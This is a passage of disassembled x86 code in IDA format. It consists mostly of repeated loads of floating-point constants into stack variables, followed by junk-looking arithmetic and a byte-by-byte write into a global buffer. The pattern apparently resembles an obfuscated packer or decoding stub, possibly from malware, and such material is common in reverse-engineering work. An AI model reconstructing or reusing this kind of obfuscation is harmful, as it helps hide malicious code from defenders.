		fld	ds:dbl_424C08
		fstp	[ebp+var_10A0]
		fld	ds:dbl_424A78
		fstp	[ebp+var_1098]
		fld	ds:dbl_424470
		fstp	[ebp+var_1090]
		fld	ds:dbl_424500
		fstp	[ebp+var_1088]
		fld	ds:dbl_424638
		fstp	[ebp+var_1080]
		fld	ds:dbl_424840
		fstp	[ebp+var_1078]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_1070]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_1068]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_1060]
		fld	ds:dbl_424818
		fstp	[ebp+var_1058]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_1050]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_1048]
		fld	ds:dbl_424958
		fstp	[ebp+var_1040]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_1038]
		fld	ds:dbl_424818
		fstp	[ebp+var_1030]
		fld	ds:dbl_424558
		fstp	[ebp+var_1028]
		fld	ds:dbl_424A78
		fstp	[ebp+var_1020]
		fld	ds:dbl_424770
		fstp	[ebp+var_1018]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_1010]
		fld	ds:dbl_424768
		fstp	[ebp+var_1008]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1000]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_FF8]
		fld	ds:dbl_424A60
		fstp	[ebp+var_FF0]
		fld	ds:dbl_424938
		fstp	[ebp+var_FE8]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_FE0]
		fld	ds:dbl_424A68
		fstp	[ebp+var_FD8]
		fld	ds:dbl_424758
		fstp	[ebp+var_FD0]
		fld	ds:dbl_424C20
		fstp	[ebp+var_FC8]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_FC0]
		fld	ds:dbl_424790
		fstp	[ebp+var_FB8]
		fld	ds:dbl_424968
		fstp	[ebp+var_FB0]
		fld	ds:dbl_424568
		fstp	[ebp+var_FA8]
		fld	ds:dbl_424848
		fstp	[ebp+var_FA0]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_F98]
		fld	ds:dbl_424A20
		fstp	[ebp+var_F90]
		fld	ds:dbl_424798
		fstp	[ebp+var_F88]
		fld	ds:dbl_424850
		fstp	[ebp+var_F80]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_F78]
		fld	ds:dbl_424A90
		fstp	[ebp+var_F70]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_F68]
		fld	ds:dbl_424C28
		fstp	[ebp+var_F60]
		fld	ds:dbl_424C18
		fstp	[ebp+var_F58]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_F50]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_F48]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_F40]
		fld	ds:dbl_424B28
		fstp	[ebp+var_F38]
		fld	ds:dbl_424B58
		fstp	[ebp+var_F30]
		fld	ds:dbl_424C08
		fstp	[ebp+var_F28]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_F20]
		fld	ds:dbl_424480
		fstp	[ebp+var_F18]
		fld	ds:dbl_424B60
		fstp	[ebp+var_F10]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_F08]
		fld	ds:dbl_424530
		fstp	[ebp+var_F00]
		fld	ds:dbl_424530
		fstp	[ebp+var_EF8]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_EF0]
		fld	ds:dbl_424A18
		fstp	[ebp+var_EE8]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_EE0]
		fld	ds:dbl_424908
		fstp	[ebp+var_ED8]
		fld	ds:dbl_424640
		fstp	[ebp+var_ED0]
		fld	ds:dbl_424530
		fstp	[ebp+var_EC8]
		fld	ds:dbl_424A80
		fstp	[ebp+var_EC0]
		fld	ds:dbl_424800
		fstp	[ebp+var_EB8]
		fld	ds:dbl_424878
		fstp	[ebp+var_EB0]
		fld	ds:dbl_424720
		fstp	[ebp+var_EA8]
		fld	ds:dbl_424490
		fstp	[ebp+var_EA0]
		fld	ds:dbl_424B88
		fstp	[ebp+var_E98]
		fld	ds:dbl_424B78
		fstp	[ebp+var_E90]
		fld	ds:dbl_424600
		fstp	[ebp+var_E88]
		fld	ds:dbl_424490
		fstp	[ebp+var_E80]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_E78]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_E70]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_E68]
		fld	ds:dbl_424518
		fstp	[ebp+var_E60]
		fld	ds:dbl_424C00
		fstp	[ebp+var_E58]
		fld	ds:dbl_424530
		fstp	[ebp+var_E50]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_E48]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_E40]
		fld	ds:dbl_424960
		fstp	[ebp+var_E38]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_E30]
		fld	ds:dbl_424C28
		fstp	[ebp+var_E28]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_E20]
		fld	ds:dbl_424598
		fstp	[ebp+var_E18]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_E10]
		fld	ds:dbl_424558
		fstp	[ebp+var_E08]
		fld	ds:dbl_424B38
		fstp	[ebp+var_E00]
		fld	ds:dbl_424A60
		fstp	[ebp+var_DF8]
		fld	ds:dbl_424B10
		fstp	[ebp+var_DF0]
		fld	ds:dbl_424450
		fstp	[ebp+var_DE8]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_DE0]
		fldz
		fstp	[ebp+var_DD8]
		fld	ds:dbl_424530
		fstp	[ebp+var_DD0]
		fld	ds:dbl_424528
		fstp	[ebp+var_DC8]
		fld	ds:dbl_424838
		fstp	[ebp+var_DC0]
		fld	ds:dbl_424938
		fstp	[ebp+var_DB8]
		fld	ds:dbl_424750
		fstp	[ebp+var_DB0]
		fld	ds:dbl_424710
		fstp	[ebp+var_DA8]
		fld	ds:dbl_424790
		fstp	[ebp+var_DA0]
		fld	ds:dbl_424C08
		fstp	[ebp+var_D98]
		fld	ds:dbl_424B00
		fstp	[ebp+var_D90]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_D88]
		fld	ds:dbl_424430
		fstp	[ebp+var_D80]
		fld	ds:dbl_424470
		fstp	[ebp+var_D78]
		fld	ds:dbl_424758
		fstp	[ebp+var_D70]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_D68]
		fld	ds:dbl_424A58
		fstp	[ebp+var_D60]
		fld	ds:dbl_424788
		fstp	[ebp+var_D58]
		fld	ds:dbl_424478
		fstp	[ebp+var_D50]
		fld	ds:dbl_424930
		fstp	[ebp+var_D48]
		fld	ds:dbl_424628
		fstp	[ebp+var_D40]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_D38]
		fld	ds:dbl_424508
		fstp	[ebp+var_D30]
		fld	ds:dbl_424A28
		fstp	[ebp+var_D28]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_D20]
		fld	ds:dbl_424510
		fstp	[ebp+var_D18]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_D10]
		fld	ds:dbl_424A48
		fstp	[ebp+var_D08]
		fld	ds:dbl_424840
		fstp	[ebp+var_D00]
		fld	ds:dbl_424820
		fstp	[ebp+var_CF8]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_CF0]
		fld	ds:dbl_424628
		fstp	[ebp+var_CE8]
		fld	ds:dbl_424560
		fstp	[ebp+var_CE0]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_CD8]
		fld	ds:dbl_424708
		fstp	[ebp+var_CD0]
		fld	ds:dbl_424878
		fstp	[ebp+var_CC8]
		fld	ds:dbl_424768
		fstp	[ebp+var_CC0]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_CB8]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_CB0]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_CA8]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_CA0]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_C98]
		fld	ds:dbl_424778
		fstp	[ebp+var_C90]
		fld	ds:dbl_424608
		fstp	[ebp+var_C88]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_C80]
		fld	ds:dbl_424788
		fstp	[ebp+var_C78]
		fld	ds:dbl_424680
		fstp	[ebp+var_C70]
		fld	ds:dbl_424A68
		fstp	[ebp+var_C68]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_C60]
		fld	ds:dbl_424530
		fstp	[ebp+var_C58]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_C50]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_C48]
		fld	ds:dbl_424600
		fstp	[ebp+var_C40]
		fld	ds:dbl_424558
		fstp	[ebp+var_C38]
		fld	ds:dbl_424988
		fstp	[ebp+var_C30]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_C28]
		fld	ds:dbl_424618
		fstp	[ebp+var_C20]
		fld	ds:dbl_424770
		fstp	[ebp+var_C18]
		fld	ds:dbl_424978
		fstp	[ebp+var_C10]
		fld	ds:dbl_424720
		fstp	[ebp+var_C08]
		fld	ds:dbl_424B28
		fstp	[ebp+var_C00]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_BF8]
		fld	ds:dbl_424640
		fstp	[ebp+var_BF0]
		fld	ds:dbl_424B80
		fstp	[ebp+var_BE8]
		fld	ds:dbl_424C20
		fstp	[ebp+var_BE0]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_BD8]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_BD0]
		fld	ds:dbl_424970
		fstp	[ebp+var_BC8]
		fld	ds:dbl_424878
		fstp	[ebp+var_BC0]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_BB8]
		fld	ds:dbl_424A98
		fstp	[ebp+var_BB0]
		fld	ds:dbl_424900
		fstp	[ebp+var_BA8]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_BA0]
		fld	ds:dbl_424908
		fstp	[ebp+var_B98]
		fld	ds:dbl_424A58
		fstp	[ebp+var_B90]
		fld	ds:dbl_424998
		fstp	[ebp+var_B88]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_B80]
		fld	ds:dbl_424930
		fstp	[ebp+var_B78]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_B70]
		fld	ds:dbl_424730
		fstp	[ebp+var_B68]
		fld	ds:dbl_424B18
		fstp	[ebp+var_B60]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_B58]
		fld	ds:dbl_424788
		fstp	[ebp+var_B50]
		fld	ds:dbl_424520
		fstp	[ebp+var_B48]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_B40]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_B38]
		fld	ds:dbl_424708
		fstp	[ebp+var_B30]
		fldz
		fstp	[ebp+var_B28]
		fld	ds:dbl_424B70
		fstp	[ebp+var_B20]
		fld	ds:dbl_424C00
		fstp	[ebp+var_B18]
		fld	ds:dbl_424C28
		fstp	[ebp+var_B10]
		fld	ds:dbl_424B58
		fstp	[ebp+var_B08]
		fld	ds:dbl_424640
		fstp	[ebp+var_B00]
		fld	ds:dbl_424910
		fstp	[ebp+var_AF8]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_AF0]
		fld	ds:dbl_424898
		fstp	[ebp+var_AE8]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_AE0]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_AD8]
		fld	ds:dbl_424B90
		fstp	[ebp+var_AD0]
		fld	ds:dbl_424920
		fstp	[ebp+var_AC8]
		fld	ds:dbl_424658
		fstp	[ebp+var_AC0]
		fld	ds:dbl_424708
		fstp	[ebp+var_AB8]
		fld	ds:dbl_424558
		fstp	[ebp+var_AB0]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_AA8]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_AA0]
		fldz
		fstp	[ebp+var_A98]
		fld	ds:dbl_424548
		fstp	[ebp+var_A90]
		fld	ds:dbl_424A88
		fstp	[ebp+var_A88]
		fld	ds:dbl_424930
		fstp	[ebp+var_A80]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_A78]
		fld	ds:dbl_424B88
		fstp	[ebp+var_A70]
		fld	ds:dbl_424A60
		fstp	[ebp+var_A68]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_A60]
		fld	ds:dbl_424650
		fstp	[ebp+var_A58]
		fld	ds:dbl_424538
		fstp	[ebp+var_A50]
		fld	ds:dbl_424490
		fstp	[ebp+var_A48]
		fld	ds:dbl_424A80
		fstp	[ebp+var_A40]
		fld	ds:dbl_424688
		fstp	[ebp+var_A38]
		fld	ds:dbl_424B20
		fstp	[ebp+var_A30]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_A28]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_A20]
		fld	ds:dbl_424578
		fstp	[ebp+var_A18]
		fld	ds:dbl_424848
		fstp	[ebp+var_A10]
		fld	ds:dbl_424780
		fstp	[ebp+var_A08]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_A00]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_9F8]
		fld	ds:dbl_424640
		fstp	[ebp+var_9F0]
		fld	ds:dbl_424880
		fstp	[ebp+var_9E8]
		fld	ds:dbl_424968
		fstp	[ebp+var_9E0]
		fld	ds:dbl_424588
		fstp	[ebp+var_9D8]
		fld	ds:dbl_424780
		fstp	[ebp+var_9D0]
		fld	ds:dbl_424A98
		fstp	[ebp+var_9C8]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_9C0]
		fldz
		fstp	[ebp+var_9B8]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_9B0]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_9A8]
		fld	ds:dbl_424638
		fstp	[ebp+var_9A0]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_998]
		fld	ds:dbl_424470
		fstp	[ebp+var_990]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_988]
		fld	ds:dbl_424510
		fstp	[ebp+var_980]
		fld	ds:dbl_424980
		fstp	[ebp+var_978]
		fld	ds:dbl_424510
		fstp	[ebp+var_970]
		fld	ds:dbl_424A20
		fstp	[ebp+var_968]
		fld	ds:dbl_424450
		fstp	[ebp+var_960]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_958]
		fld	ds:dbl_424B20
		fstp	[ebp+var_950]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_948]
		fld	ds:dbl_424970
		fstp	[ebp+var_940]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_938]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_930]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_928]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_920]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_918]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_910]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_908]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_900]
		fld	ds:dbl_424630
		fstp	[ebp+var_8F8]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_8F0]
		fld	ds:dbl_424A90
		fstp	[ebp+var_8E8]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_8E0]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_8D8]
		fld	ds:dbl_424648
		fstp	[ebp+var_8D0]
		fld	ds:dbl_424A58
		fstp	[ebp+var_8C8]
		fld	ds:dbl_424720
		fstp	[ebp+var_8C0]
		fld	ds:dbl_424648
		fstp	[ebp+var_8B8]
		fld	ds:dbl_424440
		fstp	[ebp+var_8B0]
		fld	ds:dbl_424988
		fstp	[ebp+var_8A8]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_8A0]
		fld	ds:dbl_424530
		fstp	[ebp+var_898]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_890]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_888]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_880]
		fld	ds:dbl_424C20
		fstp	[ebp+var_878]
		fld	ds:dbl_424C20
		fstp	[ebp+var_870]
		fld	ds:dbl_424690
		fstp	[ebp+var_868]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_860]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_858]
		fld	ds:dbl_424A60
		fstp	[ebp+var_850]
		fld	ds:dbl_424B08
		fstp	[ebp+var_848]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_840]
		fld	ds:dbl_424518
		fstp	[ebp+var_838]
		fld	ds:dbl_424760
		fstp	[ebp+var_830]
		fld	ds:dbl_424478
		fstp	[ebp+var_828]
		fld	ds:dbl_424908
		fstp	[ebp+var_820]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_818]
		fld	ds:dbl_424530
		fstp	[ebp+var_810]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_808]
		fld	ds:dbl_424728
		fstp	[ebp+var_800]
		fld	ds:dbl_424B30
		fstp	[ebp+var_7F8]
		fld	ds:dbl_424460
		fstp	[ebp+var_7F0]
		fld	ds:dbl_424920
		fstp	[ebp+var_7E8]
		fld	ds:dbl_424438
		fstp	[ebp+var_7E0]
		fld1
		fstp	[ebp+var_7D8]
		fld	ds:dbl_424978
		fstp	[ebp+var_7D0]
		fld	ds:dbl_424448
		fstp	[ebp+var_7C8]
		fld	ds:dbl_424708
		fstp	[ebp+var_7C0]
		fld	ds:dbl_424900
		fstp	[ebp+var_7B8]
		fld	ds:dbl_424580
		fstp	[ebp+var_7B0]
		fld	ds:dbl_424490
		fstp	[ebp+var_7A8]
		fld	ds:dbl_424B68
		fstp	[ebp+var_7A0]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_798]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_790]
		fld	ds:dbl_424480
		fstp	[ebp+var_788]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_780]
		fld	ds:dbl_424488
		fstp	[ebp+var_778]
		fld	ds:dbl_424910
		fstp	[ebp+var_770]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_768]
		fld	ds:dbl_424A58
		fstp	[ebp+var_760]
		fldz
		fstp	[ebp+var_758]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_750]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_748]
		fld	ds:dbl_424B90
		fstp	[ebp+var_740]
		fld	ds:dbl_424778
		fstp	[ebp+var_738]
		fld	ds:dbl_424598
		fstp	[ebp+var_730]
		fld	ds:dbl_424970
		fstp	[ebp+var_728]
		fld	ds:dbl_424830
		fstp	[ebp+var_720]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_718]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_710]
		fld	ds:dbl_424B90
		fstp	[ebp+var_708]
		fld	ds:dbl_424860
		fstp	[ebp+var_700]
		fld	ds:dbl_424748
		fstp	[ebp+var_6F8]
		fld	ds:dbl_424B78
		fstp	[ebp+var_6F0]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_6E8]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_6E0]
		fld	ds:dbl_424B38
		fstp	[ebp+var_6D8]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_6D0]
		fld	ds:dbl_424B68
		fstp	[ebp+var_6C8]
		fld	ds:dbl_424810
		fstp	[ebp+var_6C0]
		fld	ds:dbl_424B40
		fstp	[ebp+var_6B8]
		fld	ds:dbl_424B18
		fstp	[ebp+var_6B0]
		fld	ds:dbl_424648
		fstp	[ebp+var_6A8]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_6A0]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_698]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_690]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_688]
		fld	ds:dbl_424918
		fstp	[ebp+var_680]
		fld	ds:dbl_424520
		fstp	[ebp+var_678]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_670]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_668]
		fld	ds:dbl_424868
		fstp	[ebp+var_660]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_658]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_650]
		fld	ds:dbl_424580
		fstp	[ebp+var_648]
		fld	ds:dbl_424A90
		fstp	[ebp+var_640]
		fld	ds:dbl_424518
		fstp	[ebp+var_638]
		fld	ds:dbl_424470
		fstp	[ebp+var_630]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_628]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_620]
		fld	ds:dbl_424960
		fstp	[ebp+var_618]
		fld	ds:dbl_424B90
		fstp	[ebp+var_610]
		fld	ds:dbl_424970
		fstp	[ebp+var_608]
		fld	ds:dbl_424990
		fstp	[ebp+var_600]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_5F8]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_5F0]
		fld	ds:dbl_424B00
		fstp	[ebp+var_5E8]
		fld	ds:dbl_424430
		fstp	[ebp+var_5E0]
		fld	ds:dbl_424938
		fstp	[ebp+var_5D8]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_5D0]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_5C8]
		fld	ds:dbl_424B58
		fstp	[ebp+var_5C0]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_5B8]
		fld	ds:dbl_424B70
		fstp	[ebp+var_5B0]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_5A8]
		fld	ds:dbl_424988
		fstp	[ebp+var_5A0]
		fld	ds:dbl_424538
		fstp	[ebp+var_598]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_590]
		fld	ds:dbl_424A48
		fstp	[ebp+var_588]
		fld	ds:dbl_4244F8
		fstp	[ebp+var_580]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_578]
		fld	ds:dbl_424558
		fstp	[ebp+var_570]
		fld	ds:dbl_424858
		fstp	[ebp+var_568]
		fld	ds:dbl_424568
		fstp	[ebp+var_560]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_558]
		fld	ds:dbl_424B28
		fstp	[ebp+var_550]
		fld	ds:dbl_424590
		fstp	[ebp+var_548]
		fld	ds:dbl_424488
		fstp	[ebp+var_540]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_538]
		fld	ds:dbl_424670
		fstp	[ebp+var_530]
		fld	ds:dbl_424730
		fstp	[ebp+var_528]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_520]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_518]
		fld	ds:dbl_424840
		fstp	[ebp+var_510]
		fld	ds:dbl_424620
		fstp	[ebp+var_508]
		fld	ds:dbl_424798
		fstp	[ebp+var_500]
		fld	ds:dbl_424438
		fstp	[ebp+var_4F8]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_4F0]
		fld	ds:dbl_424500
		fstp	[ebp+var_4E8]
		fld	ds:dbl_424548
		fstp	[ebp+var_4E0]
		fld	ds:dbl_424A18
		fstp	[ebp+var_4D8]
		fld	ds:dbl_424A68
		fstp	[ebp+var_4D0]
		fld	ds:dbl_424950
		fstp	[ebp+var_4C8]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_4C0]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_4B8]
		fld	ds:dbl_424768
		fstp	[ebp+var_4B0]
		fld	ds:dbl_424890
		fstp	[ebp+var_4A8]
		fld	ds:dbl_424818
		fstp	[ebp+var_4A0]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_498]
		fld	ds:dbl_424800
		fstp	[ebp+var_490]
		fld	ds:dbl_424B88
		fstp	[ebp+var_488]
		fld	ds:dbl_424A20
		fstp	[ebp+var_480]
		fld	ds:dbl_424B70
		fstp	[ebp+var_478]
		fld	ds:dbl_424818
		fstp	[ebp+var_470]
		fld	ds:dbl_424570
		fstp	[ebp+var_468]
		fld	ds:dbl_424B18
		fstp	[ebp+var_460]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_458]
		fld	ds:dbl_424728
		fstp	[ebp+var_450]
		fld	ds:dbl_424B10
		fstp	[ebp+var_448]
		fld	ds:dbl_424530
		fstp	[ebp+var_440]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_438]
		fld	ds:dbl_424940
		fstp	[ebp+var_430]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_428]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_420]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_418]
		fld	ds:dbl_424530
		fstp	[ebp+var_410]
		fld	ds:dbl_424698
		fstp	[ebp+var_408]
		fld	ds:dbl_424928
		fstp	[ebp+var_400]
		fld	ds:dbl_424890
		fstp	[ebp+var_3F8]
		fld	ds:dbl_424738
		fstp	[ebp+var_3F0]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_3E8]
		fld	ds:dbl_424850
		fstp	[ebp+var_3E0]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_3D8]
		fld	ds:dbl_424B90
		fstp	[ebp+var_3D0]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_3C8]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_3C0]
		fld	ds:dbl_424660
		fstp	[ebp+var_3B8]
		fld	ds:dbl_424870
		fstp	[ebp+var_3B0]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_3A8]
		fld	ds:dbl_424708
		fstp	[ebp+var_3A0]
		fld	ds:dbl_424B38
		fstp	[ebp+var_398]
		fld	ds:dbl_424590
		fstp	[ebp+var_390]
		fld	ds:dbl_424510
		fstp	[ebp+var_388]
		fld	ds:dbl_424568
		fstp	[ebp+var_380]
		fld	ds:dbl_424660
		fstp	[ebp+var_378]
		fld	ds:dbl_424908
		fstp	[ebp+var_370]
		fld	ds:dbl_424600
		fstp	[ebp+var_368]
		fld	ds:dbl_424650
		fstp	[ebp+var_360]
		fld	ds:dbl_424550
		fstp	[ebp+var_358]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_350]
		fld	ds:dbl_424A70
		fstp	[ebp+var_348]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_340]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_338]
		fld	ds:dbl_424A78
		fstp	[ebp+var_330]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_328]
		fld	ds:dbl_424B48
		fstp	[ebp+var_320]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_318]
		fld	ds:dbl_424968
		fstp	[ebp+var_310]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_308]
		fld	ds:dbl_424840
		fstp	[ebp+var_300]
		fld	ds:dbl_424558
		fstp	[ebp+var_2F8]
		fld	ds:dbl_424A10
		fstp	[ebp+var_2F0]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_2E8]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_2E0]
		fld	ds:dbl_424550
		fstp	[ebp+var_2D8]
		fld	ds:dbl_424498
		fstp	[ebp+var_2D0]
		fld	ds:dbl_424C10
		fstp	[ebp+var_2C8]
		fld	ds:dbl_424A70
		fstp	[ebp+var_2C0]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_2B8]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_2B0]
		fld	ds:dbl_424450
		fstp	[ebp+var_2A8]
		fld	ds:dbl_424778
		fstp	[ebp+var_2A0]
		fld	ds:dbl_424758
		fstp	[ebp+var_298]
		fld	ds:dbl_424588
		fstp	[ebp+var_290]
		fld	ds:dbl_424A60
		fstp	[ebp+var_288]
		fld	ds:dbl_424670
		fstp	[ebp+var_280]
		mov	ecx, dword_4311A0
		add	ecx, [ebp+var_A0]
		mov	dl, [ebp+var_23]
		mov	[ecx], dl
		mov	eax, [ebp+var_268]
		add	eax, 49h
		mov	[ebp+var_FC], eax
		mov	[ebp+pgui], 2
		mov	ecx, [ebp+var_FC]
		add	ecx, 2Dh
		or	ecx, [ebp+wFirst]
		mov	[ebp+var_18], ecx
		mov	edx, [ebp+var_25C]
		add	edx, [ebp+pvOut]
		mov	[ebp+hdc], edx
		mov	eax, [ebp+var_A0]
		add	eax, 1
		mov	[ebp+var_A0], eax
		movzx	ecx, [ebp+var_1D1]
		movzx	edx, [ebp+var_CC]
		sub	ecx, edx
		movzx	eax, [ebp+var_1B0]
		lea	ecx, [eax+ecx-8]
		mov	[ebp+var_1B0], cx
		mov	lpExitCode, 0Ch
		movzx	edx, [ebp+var_E8]
		movzx	eax, [ebp+var_99]
		or	edx, eax
		mov	dword_42C03C, edx
		movzx	ecx, [ebp+var_11C]
		and	ecx, [ebp+var_258]
		xor	ecx, 3Dh
		mov	[ebp+var_258], ecx
		mov	edx, 3Bh
		sub	edx, [ebp+var_130]
		mov	eax, [ebp+var_FC]
		lea	ecx, [edx+eax-52h]
		or	ecx, 44h
		mov	[ebp+var_105], cl
		mov	edx, [ebp+pvIn]
		sub	edx, 40h
		mov	[ebp+pgui], edx
		mov	eax, [ebp+var_A0]
		cmp	eax, dword_42C064
		jnz	loc_40A46D
		push	12h		; hdc
		call	ds:GetTextCharset
		sub	eax, 41h
		sub	eax, [ebp+var_258]
		mov	[ebp+var_104], eax
		mov	ecx, lpExitCode
		mov	Wow64Process, ecx
		mov	Wow64Process, 4Ah
		cmp	[ebp+wFirst], 5Bh
		jle	short loc_40E5E2
		movzx	edx, [ebp+var_1D8]
		movzx	eax, [ebp+var_269]
		lea	ecx, [edx+eax+5Ah]
		mov	[ebp+var_94], ecx
		movzx	edx, [ebp+var_22]
		sub	edx, y
		mov	y, edx

loc_40E5E2:				; CODE XREF: sub_409DF0+47C8j
		mov	eax, [ebp+var_130]
